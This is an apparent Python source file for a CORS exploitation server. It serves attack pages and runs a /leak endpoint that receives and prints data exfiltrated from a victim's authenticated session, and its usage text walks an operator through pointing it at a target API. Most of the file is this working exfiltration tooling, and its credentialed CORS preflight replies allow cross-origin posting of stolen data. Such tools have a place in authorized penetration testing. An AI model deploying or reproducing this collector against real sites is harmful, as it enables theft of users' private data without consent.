#!/usr/bin/env python3
"""
CORS Vulnerability Tester & Exploit Tool
Tests for misconfigured CORS policies that leak sensitive data
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from pathlib import Path
import sys

# Directory where static files live (same as this script)
STATIC_DIR = Path(__file__).parent.resolve()

MIME_TYPES = {
    ".html": "text/html; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
}


class CORSExploitHandler(BaseHTTPRequestHandler):
    """Handler for CORS exploit server"""

    def log_message(self, format, *args):
        """Minimal logging"""
        if self.command != "GET" or "/favicon.ico" not in self.path:
            print(f"[{self.command}] {args[0]}")

    def serve_file(self, filename):
        """Serve a static file from STATIC_DIR"""
        filepath = STATIC_DIR / filename
        if not filepath.exists():
            self.send_response(404)
            self.end_headers()
            return

        content = filepath.read_bytes()
        ext = filepath.suffix
        mime = MIME_TYPES.get(ext, "application/octet-stream")

        self.send_response(200)
        self.send_header("Content-Type", mime)
        self.send_header("Content-Length", len(content))
        self.end_headers()
        self.wfile.write(content)

    def do_GET(self):
        """Serve static files"""
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/" or path == "/index.html":
            self.serve_file("index.html")
        elif path == "/style.css":
            self.serve_file("style.css")
        elif path == "/script.js":
            self.serve_file("script.js")
        elif path == "/favicon.ico":
            self.send_response(404)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        """Receive exfiltrated data"""
        parsed = urlparse(self.path)

        if parsed.path == "/leak":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8", errors="ignore")

            print("\n" + "=" * 70)
            print("LEAKED DATA CAPTURED")
            print("=" * 70)
            print(f"Timestamp: {self.log_date_time_string()}")
            print(f"Client IP: {self.client_address[0]}")
            print(f"Origin: {self.headers.get('Origin', 'N/A')}")
            print(f"Content-Length: {content_length} bytes")
            print("\nPayload:")
            print("-" * 70)
            print(body)
            print("=" * 70 + "\n")

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"received"}')
        else:
            self.send_response(404)
            self.end_headers()

    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", self.headers.get("Origin", "*"))
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.end_headers()


def main():
    """Run the CORS exploit server"""

    host = "127.0.0.1"
    port = 9999

    if len(sys.argv) > 1:
        host = sys.argv[1]
    if len(sys.argv) > 2:
        port = int(sys.argv[2])

    addr = (host, port)

    print("\n" + "=" * 70)
    print("CORS Vulnerability Exploitation Server")
    print("=" * 70)
    print(f"Server Address: http://{host}:{port}")
    print(f"\nUsage:")
    print(f"  1. Authenticate to target application in browser")
    print(f"  2. Navigate to: http://{host}:{port}/?target=http://target.com/api/endpoint")
    print(f"  3. Check this terminal for captured data")
    print("=" * 70 + "\n")

    try:
        server = HTTPServer(addr, CORSExploitHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\nServer stopped by user")
    except OSError as e:
        print(f"\nError: {e}")
        print(f"Suggestion: Verify port availability or DNS configuration for {host}")


if __name__ == "__main__":
    main()
